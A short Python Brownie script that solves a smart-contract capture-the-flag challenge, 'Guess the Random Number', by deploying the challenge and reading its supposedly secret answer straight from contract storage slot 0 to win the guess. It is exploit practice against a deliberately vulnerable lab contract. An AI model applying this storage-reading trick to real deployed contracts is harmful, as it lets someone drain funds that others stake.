from brownie import GuessTheRandomNumberChallenge, accounts, web3


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = GuessTheRandomNumberChallenge.deploy(
        {'from': deployer, 'value': '1 ether'})

    contract.guess(web3.eth.get_storage_at(contract.address, 0),
                   {'from': player, 'value': '1 ether'})

    assert contract.isComplete() == True
